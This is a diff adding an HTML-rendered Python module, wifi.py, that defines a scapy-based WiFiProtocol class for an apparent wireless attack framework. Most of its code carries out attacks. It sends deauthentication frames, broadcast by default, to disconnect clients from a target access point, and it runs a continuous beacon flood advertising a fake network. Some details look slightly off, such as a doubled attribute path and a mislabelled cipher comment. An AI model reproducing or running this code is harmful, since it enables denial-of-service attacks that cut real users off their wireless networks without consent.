@@ -1,0 +1,156 @@
+<html>
+<head>
+<title>wifi.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.s0 { color: #fede5d; font-style: italic;}
+.s1 { color: #ffffff;}
+.s2 { color: #b6b1b1;}
+.s3 { color: #fede5d;}
+.s4 { color: #03edf9;}
+.s5 { color: #ff8b39;}
+.s6 { color: #848bbd; font-style: italic;}
+.s7 { color: #36f9f6;}
+.s8 { color: #f97e72;}
+.ln { color: #ffffff; font-weight: normal; font-style: normal; }
+</style>
+</head>
+<body bgcolor="#262335">
+<table CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<tr><td><center>
+<font face="Arial, Helvetica" color="#000000">
+wifi.py</font>
+</center></td></tr></table>
+<pre><a name="l1"><span class="ln">1    </span></a><span class="s0">from </span><span class="s1">scapy</span><span class="s2">.</span><span class="s1">all </span><span class="s0">import </span><span class="s3">*</span>
+<a name="l2"><span class="ln">2    </span></a><span class="s0">from </span><span class="s1">scapy</span><span class="s2">.</span><span class="s1">layers</span><span class="s2">.</span><span class="s1">dot11 </span><span class="s0">import </span><span class="s1">Dot11</span><span class="s2">, </span><span class="s1">Dot11Beacon</span><span class="s2">, </span><span class="s1">Dot11Deauth</span>
+<a name="l3"><span class="ln">3    </span></a><span class="s0">import </span><span class="s1">threading</span>
+<a name="l4"><span class="ln">4    </span></a><span class="s0">import </span><span class="s1">logging</span>
+<a name="l5"><span class="ln">5    </span></a><span class="s0">from </span><span class="s2">.</span><span class="s1">base_protocol </span><span class="s0">import </span><span class="s1">BaseProtocol</span>
+<a name="l6"><span class="ln">6    </span></a>
+<a name="l7"><span class="ln">7    </span></a><span class="s0">class </span><span class="s1">WiFiProtocol</span><span class="s4">(</span><span class="s1">BaseProtocol</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l8"><span class="ln">8    </span></a>    <span class="s0">def </span><span class="s1">__init__</span><span class="s4">(</span><span class="s1">self</span><span class="s2">, </span><span class="s1">interface</span><span class="s3">=</span><span class="s5">'wlan0mon'</span><span class="s2">, </span><span class="s1">core</span><span class="s3">=</span><span class="s0">None</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l9"><span class="ln">9    </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l10"><span class="ln">10   </span></a>        Initializes the WiFiProtocol. 
+<a name="l11"><span class="ln">11   </span></a> 
+<a name="l12"><span class="ln">12   </span></a>        :param interface: Wireless interface in monitor mode. 
+<a name="l13"><span class="ln">13   </span></a>        :param core: Reference to the CoreFramework instance. 
+<a name="l14"><span class="ln">14   </span></a>        &quot;&quot;&quot;</span>
+<a name="l15"><span class="ln">15   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">interface </span><span class="s3">= </span><span class="s1">interface</span>
+<a name="l16"><span class="ln">16   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger </span><span class="s3">= </span><span class="s1">logging</span><span class="s2">.</span><span class="s1">getLogger</span><span class="s4">(</span><span class="s1">self</span><span class="s2">.</span><span class="s1">__class__</span><span class="s2">.</span><span class="s1">__name__</span><span class="s4">)</span>
+<a name="l17"><span class="ln">17   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">scan_results </span><span class="s3">= </span><span class="s7">{}</span>
+<a name="l18"><span class="ln">18   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">core </span><span class="s3">= </span><span class="s1">core  </span><span class="s6"># Reference to CoreFramework for packet handling</span>
+<a name="l19"><span class="ln">19   </span></a>
+<a name="l20"><span class="ln">20   </span></a>    <span class="s0">def </span><span class="s1">register</span><span class="s4">(</span><span class="s1">self</span><span class="s2">, </span><span class="s1">event_dispatcher</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l21"><span class="ln">21   </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l22"><span class="ln">22   </span></a>        Registers event listeners relevant to Wi-Fi operations. 
+<a name="l23"><span class="ln">23   </span></a>        &quot;&quot;&quot;</span>
+<a name="l24"><span class="ln">24   </span></a>        <span class="s6"># Subscribe to events</span>
+<a name="l25"><span class="ln">25   </span></a>        <span class="s1">event_dispatcher</span><span class="s2">.</span><span class="s1">subscribe</span><span class="s4">(</span><span class="s5">'start_scan'</span><span class="s2">, </span><span class="s1">self</span><span class="s2">.</span><span class="s1">start_scan</span><span class="s4">)</span>
+<a name="l26"><span class="ln">26   </span></a>        <span class="s1">event_dispatcher</span><span class="s2">.</span><span class="s1">subscribe</span><span class="s4">(</span><span class="s5">'stop_scan'</span><span class="s2">, </span><span class="s1">self</span><span class="s2">.</span><span class="s1">stop_scan</span><span class="s4">)</span>
+<a name="l27"><span class="ln">27   </span></a>        <span class="s1">event_dispatcher</span><span class="s2">.</span><span class="s1">subscribe</span><span class="s4">(</span><span class="s5">'start_deauth'</span><span class="s2">, </span><span class="s1">self</span><span class="s2">.</span><span class="s1">start_deauth</span><span class="s4">)</span>
+<a name="l28"><span class="ln">28   </span></a>        <span class="s1">event_dispatcher</span><span class="s2">.</span><span class="s1">subscribe</span><span class="s4">(</span><span class="s5">'stop_deauth'</span><span class="s2">, </span><span class="s1">self</span><span class="s2">.</span><span class="s1">stop_deauth</span><span class="s4">)</span>
+<a name="l29"><span class="ln">29   </span></a>        <span class="s1">event_dispatcher</span><span class="s2">.</span><span class="s1">subscribe</span><span class="s4">(</span><span class="s5">'start_beacon_flood'</span><span class="s2">, </span><span class="s1">self</span><span class="s2">.</span><span class="s1">start_beacon_flood</span><span class="s4">)</span>
+<a name="l30"><span class="ln">30   </span></a>        <span class="s1">event_dispatcher</span><span class="s2">.</span><span class="s1">subscribe</span><span class="s4">(</span><span class="s5">'stop_beacon_flood'</span><span class="s2">, </span><span class="s1">self</span><span class="s2">.</span><span class="s1">stop_beacon_flood</span><span class="s4">)</span>
+<a name="l31"><span class="ln">31   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">&quot;WiFiProtocol registered to Event Dispatcher.&quot;</span><span class="s4">)</span>
+<a name="l32"><span class="ln">32   </span></a>
+<a name="l33"><span class="ln">33   </span></a>    <span class="s0">def </span><span class="s1">start</span><span class="s4">(</span><span class="s1">self</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l34"><span class="ln">34   </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l35"><span class="ln">35   </span></a>        Starts any necessary Wi-Fi operations. 
+<a name="l36"><span class="ln">36   </span></a>        &quot;&quot;&quot;</span>
+<a name="l37"><span class="ln">37   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">&quot;Starting Wi-Fi Protocol operations.&quot;</span><span class="s4">)</span>
+<a name="l38"><span class="ln">38   </span></a>        <span class="s6"># For example, initiate packet sniffing via CoreFramework</span>
+<a name="l39"><span class="ln">39   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">core</span><span class="s2">.</span><span class="s1">start_packet_sniffing</span><span class="s4">()</span>
+<a name="l40"><span class="ln">40   </span></a>
+<a name="l41"><span class="ln">41   </span></a>    <span class="s0">def </span><span class="s1">stop</span><span class="s4">(</span><span class="s1">self</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l42"><span class="ln">42   </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l43"><span class="ln">43   </span></a>        Stops any ongoing Wi-Fi operations. 
+<a name="l44"><span class="ln">44   </span></a>        &quot;&quot;&quot;</span>
+<a name="l45"><span class="ln">45   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">&quot;Stopping Wi-Fi Protocol operations.&quot;</span><span class="s4">)</span>
+<a name="l46"><span class="ln">46   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">core</span><span class="s2">.</span><span class="s1">stop_packet_sniffing</span><span class="s4">()</span>
+<a name="l47"><span class="ln">47   </span></a>
+<a name="l48"><span class="ln">48   </span></a>    <span class="s0">def </span><span class="s1">start_scan</span><span class="s4">(</span><span class="s1">self</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l49"><span class="ln">49   </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l50"><span class="ln">50   </span></a>        Initiates a Wi-Fi scan. 
+<a name="l51"><span class="ln">51   </span></a>        &quot;&quot;&quot;</span>
+<a name="l52"><span class="ln">52   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">&quot;Starting Wi-Fi scan.&quot;</span><span class="s4">)</span>
+<a name="l53"><span class="ln">53   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">scan_results </span><span class="s3">= </span><span class="s7">{}</span>
+<a name="l54"><span class="ln">54   </span></a>        <span class="s6"># The packet sniffer is already running; scan results are collected by the Packet Analyzer</span>
+<a name="l55"><span class="ln">55   </span></a>
+<a name="l56"><span class="ln">56   </span></a>    <span class="s0">def </span><span class="s1">stop_scan</span><span class="s4">(</span><span class="s1">self</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l57"><span class="ln">57   </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l58"><span class="ln">58   </span></a>        Stops the Wi-Fi scan and processes results. 
+<a name="l59"><span class="ln">59   </span></a>        &quot;&quot;&quot;</span>
+<a name="l60"><span class="ln">60   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">&quot;Stopping Wi-Fi scan.&quot;</span><span class="s4">)</span>
+<a name="l61"><span class="ln">61   </span></a>        <span class="s6"># Since the sniffer runs continuously, you might implement scan duration or trigger stop externally</span>
+<a name="l62"><span class="ln">62   </span></a>        <span class="s6"># For simplicity, assume the scan duration is managed by the test script</span>
+<a name="l63"><span class="ln">63   </span></a>
+<a name="l64"><span class="ln">64   </span></a>    <span class="s0">def </span><span class="s1">start_deauth</span><span class="s4">(</span><span class="s1">self</span><span class="s2">, </span><span class="s1">target_bssid</span><span class="s2">, </span><span class="s1">target_client</span><span class="s3">=</span><span class="s0">None</span><span class="s2">, </span><span class="s1">count</span><span class="s3">=</span><span class="s8">10</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l65"><span class="ln">65   </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l66"><span class="ln">66   </span></a>        Initiates a deauthentication attack. 
+<a name="l67"><span class="ln">67   </span></a> 
+<a name="l68"><span class="ln">68   </span></a>        :param target_bssid: BSSID of the target access point. 
+<a name="l69"><span class="ln">69   </span></a>        :param target_client: (Optional) Specific client to deauthenticate. 
+<a name="l70"><span class="ln">70   </span></a>        :param count: Number of deauth packets to send. 
+<a name="l71"><span class="ln">71   </span></a>        &quot;&quot;&quot;</span>
+<a name="l72"><span class="ln">72   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">f&quot;Starting deauthentication attack on BSSID: </span><span class="s7">{</span><span class="s1">target_bssid</span><span class="s7">}</span><span class="s5">&quot;</span><span class="s4">)</span>
+<a name="l73"><span class="ln">73   </span></a>        <span class="s1">dot11 </span><span class="s3">= </span><span class="s1">Dot11</span><span class="s4">(</span><span class="s1">addr1</span><span class="s3">=</span><span class="s1">target_client </span><span class="s0">if </span><span class="s1">target_client </span><span class="s0">else </span><span class="s5">'FF:FF:FF:FF:FF:FF'</span><span class="s2">,</span>
+<a name="l74"><span class="ln">74   </span></a>                    <span class="s1">addr2</span><span class="s3">=</span><span class="s1">self</span><span class="s2">.</span><span class="s1">core</span><span class="s2">.</span><span class="s1">packet_handler</span><span class="s2">.</span><span class="s1">packet_injector</span><span class="s2">.</span><span class="s1">packet_injector</span><span class="s2">.</span><span class="s1">get_interface_mac</span><span class="s4">()</span><span class="s2">,</span>
+<a name="l75"><span class="ln">75   </span></a>                    <span class="s1">addr3</span><span class="s3">=</span><span class="s1">target_bssid</span><span class="s4">)</span>
+<a name="l76"><span class="ln">76   </span></a>        <span class="s1">pkt </span><span class="s3">= </span><span class="s1">RadioTap</span><span class="s4">()</span><span class="s3">/</span><span class="s1">dot11</span><span class="s3">/</span><span class="s1">Dot11Deauth</span><span class="s4">(</span><span class="s1">reason</span><span class="s3">=</span><span class="s8">7</span><span class="s4">)</span>
+<a name="l77"><span class="ln">77   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">core</span><span class="s2">.</span><span class="s1">send_packet</span><span class="s4">(</span><span class="s1">pkt</span><span class="s2">, </span><span class="s1">count</span><span class="s3">=</span><span class="s1">count</span><span class="s2">, </span><span class="s1">inter</span><span class="s3">=</span><span class="s8">0.1</span><span class="s4">)</span>
+<a name="l78"><span class="ln">78   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">&quot;Deauthentication attack completed.&quot;</span><span class="s4">)</span>
+<a name="l79"><span class="ln">79   </span></a>
+<a name="l80"><span class="ln">80   </span></a>    <span class="s0">def </span><span class="s1">stop_deauth</span><span class="s4">(</span><span class="s1">self</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l81"><span class="ln">81   </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l82"><span class="ln">82   </span></a>        Stops the deauthentication attack. 
+<a name="l83"><span class="ln">83   </span></a>        &quot;&quot;&quot;</span>
+<a name="l84"><span class="ln">84   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">&quot;Stopping deauthentication attack.&quot;</span><span class="s4">)</span>
+<a name="l85"><span class="ln">85   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">core</span><span class="s2">.</span><span class="s1">stop_continuous_packets</span><span class="s4">()</span>
+<a name="l86"><span class="ln">86   </span></a>
+<a name="l87"><span class="ln">87   </span></a>    <span class="s0">def </span><span class="s1">start_beacon_flood</span><span class="s4">(</span><span class="s1">self</span><span class="s2">, </span><span class="s1">ssid</span><span class="s3">=</span><span class="s5">'FakeAP'</span><span class="s2">, </span><span class="s1">count</span><span class="s3">=</span><span class="s8">1000</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l88"><span class="ln">88   </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l89"><span class="ln">89   </span></a>        Starts a beacon flooding attack. 
+<a name="l90"><span class="ln">90   </span></a> 
+<a name="l91"><span class="ln">91   </span></a>        :param ssid: SSID of the fake access point. 
+<a name="l92"><span class="ln">92   </span></a>        :param count: Number of beacon frames to send. 
+<a name="l93"><span class="ln">93   </span></a>        &quot;&quot;&quot;</span>
+<a name="l94"><span class="ln">94   </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">f&quot;Starting beacon flooding attack with SSID '</span><span class="s7">{</span><span class="s1">ssid</span><span class="s7">}</span><span class="s5">'.&quot;</span><span class="s4">)</span>
+<a name="l95"><span class="ln">95   </span></a>        <span class="s1">dot11 </span><span class="s3">= </span><span class="s1">Dot11</span><span class="s4">(</span><span class="s1">type</span><span class="s3">=</span><span class="s8">0</span><span class="s2">, </span><span class="s1">subtype</span><span class="s3">=</span><span class="s8">8</span><span class="s2">, </span><span class="s1">addr1</span><span class="s3">=</span><span class="s5">'FF:FF:FF:FF:FF:FF'</span><span class="s2">,</span>
+<a name="l96"><span class="ln">96   </span></a>                    <span class="s1">addr2</span><span class="s3">=</span><span class="s1">self</span><span class="s2">.</span><span class="s1">get_interface_mac</span><span class="s4">()</span><span class="s2">,</span>
+<a name="l97"><span class="ln">97   </span></a>                    <span class="s1">addr3</span><span class="s3">=</span><span class="s1">self</span><span class="s2">.</span><span class="s1">get_interface_mac</span><span class="s4">())</span>
+<a name="l98"><span class="ln">98   </span></a>        <span class="s1">beacon </span><span class="s3">= </span><span class="s1">Dot11Beacon</span><span class="s4">(</span><span class="s1">cap</span><span class="s3">=</span><span class="s5">'ESS+privacy'</span><span class="s4">)</span>
+<a name="l99"><span class="ln">99   </span></a>        <span class="s1">essid </span><span class="s3">= </span><span class="s1">Dot11Elt</span><span class="s4">(</span><span class="s1">ID</span><span class="s3">=</span><span class="s5">'SSID'</span><span class="s2">, </span><span class="s1">info</span><span class="s3">=</span><span class="s1">ssid</span><span class="s2">, </span><span class="s1">len</span><span class="s3">=</span><span class="s1">len</span><span class="s4">(</span><span class="s1">ssid</span><span class="s4">))</span>
+<a name="l100"><span class="ln">100  </span></a>        <span class="s1">rsn </span><span class="s3">= </span><span class="s1">Dot11Elt</span><span class="s4">(</span><span class="s1">ID</span><span class="s3">=</span><span class="s5">'RSNinfo'</span><span class="s2">, </span><span class="s1">info</span><span class="s3">=</span><span class="s4">(</span>
+<a name="l101"><span class="ln">101  </span></a>            <span class="s5">'</span><span class="s7">\x01\x00</span><span class="s5">'  </span><span class="s6"># RSN Version 1</span>
+<a name="l102"><span class="ln">102  </span></a>            <span class="s5">'</span><span class="s7">\x00\x0f\xac\x02</span><span class="s5">'  </span><span class="s6"># Group Cipher Suite: CCMP</span>
+<a name="l103"><span class="ln">103  </span></a>            <span class="s5">'</span><span class="s7">\x02\x00</span><span class="s5">'  </span><span class="s6"># Pairwise Cipher Suite Count</span>
+<a name="l104"><span class="ln">104  </span></a>            <span class="s5">'</span><span class="s7">\x00\x0f\xac\x04</span><span class="s5">'  </span><span class="s6"># Pairwise Cipher Suite: CCMP</span>
+<a name="l105"><span class="ln">105  </span></a>            <span class="s5">'</span><span class="s7">\x00\x0f\xac\x02</span><span class="s5">'  </span><span class="s6"># Pairwise Cipher Suite: TKIP</span>
+<a name="l106"><span class="ln">106  </span></a>            <span class="s5">'</span><span class="s7">\x01\x00</span><span class="s5">'  </span><span class="s6"># AKM Suite Count</span>
+<a name="l107"><span class="ln">107  </span></a>            <span class="s5">'</span><span class="s7">\x00\x0f\xac\x02</span><span class="s5">'  </span><span class="s6"># AKM Suite: PSK</span>
+<a name="l108"><span class="ln">108  </span></a>            <span class="s5">'</span><span class="s7">\x00\x00</span><span class="s5">'  </span><span class="s6"># RSN Capabilities</span>
+<a name="l109"><span class="ln">109  </span></a>        <span class="s4">))</span>
+<a name="l110"><span class="ln">110  </span></a>        <span class="s1">frame </span><span class="s3">= </span><span class="s1">RadioTap</span><span class="s4">()</span><span class="s3">/</span><span class="s1">dot11</span><span class="s3">/</span><span class="s1">beacon</span><span class="s3">/</span><span class="s1">essid</span><span class="s3">/</span><span class="s1">rsn</span>
+<a name="l111"><span class="ln">111  </span></a>
+<a name="l112"><span class="ln">112  </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">core</span><span class="s2">.</span><span class="s1">send_continuous_packets</span><span class="s4">(</span><span class="s1">frame</span><span class="s2">, </span><span class="s1">interval</span><span class="s3">=</span><span class="s8">0.1</span><span class="s4">)</span>
+<a name="l113"><span class="ln">113  </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">&quot;Beacon flooding attack started.&quot;</span><span class="s4">)</span>
+<a name="l114"><span class="ln">114  </span></a>
+<a name="l115"><span class="ln">115  </span></a>    <span class="s0">def </span><span class="s1">stop_beacon_flood</span><span class="s4">(</span><span class="s1">self</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l116"><span class="ln">116  </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l117"><span class="ln">117  </span></a>        Stops the beacon flooding attack. 
+<a name="l118"><span class="ln">118  </span></a>        &quot;&quot;&quot;</span>
+<a name="l119"><span class="ln">119  </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">info</span><span class="s4">(</span><span class="s5">&quot;Stopping beacon flooding attack.&quot;</span><span class="s4">)</span>
+<a name="l120"><span class="ln">120  </span></a>        <span class="s1">self</span><span class="s2">.</span><span class="s1">core</span><span class="s2">.</span><span class="s1">stop_continuous_packets</span><span class="s4">()</span>
+<a name="l121"><span class="ln">121  </span></a>
+<a name="l122"><span class="ln">122  </span></a>    <span class="s0">def </span><span class="s1">get_interface_mac</span><span class="s4">(</span><span class="s1">self</span><span class="s4">)</span><span class="s3">:</span>
+<a name="l123"><span class="ln">123  </span></a>        <span class="s6">&quot;&quot;&quot; 
+<a name="l124"><span class="ln">124  </span></a>        Retrieves the MAC address of the specified wireless interface. 
+<a name="l125"><span class="ln">125  </span></a>        &quot;&quot;&quot;</span>
+<a name="l126"><span class="ln">126  </span></a>        <span class="s0">try</span><span class="s3">:</span>
+<a name="l127"><span class="ln">127  </span></a>            <span class="s0">return </span><span class="s1">get_if_hwaddr</span><span class="s4">(</span><span class="s1">self</span><span class="s2">.</span><span class="s1">interface</span><span class="s4">)</span>
+<a name="l128"><span class="ln">128  </span></a>        <span class="s0">except </span><span class="s1">Exception </span><span class="s0">as </span><span class="s1">e</span><span class="s3">:</span>
+<a name="l129"><span class="ln">129  </span></a>            <span class="s1">self</span><span class="s2">.</span><span class="s1">logger</span><span class="s2">.</span><span class="s1">error</span><span class="s4">(</span><span class="s5">f&quot;Failed to get MAC address for interface </span><span class="s7">{</span><span class="s1">self</span><span class="s2">.</span><span class="s1">interface</span><span class="s7">}</span><span class="s5">: </span><span class="s7">{</span><span class="s1">e</span><span class="s7">}</span><span class="s5">&quot;</span><span class="s4">)</span>
+<a name="l130"><span class="ln">130  </span></a>            <span class="s0">return </span><span class="s5">'00:00:00:00:00:00'</span>
+<a name="l131"><span class="ln">131  </span></a></pre>
+</body>
+</html>
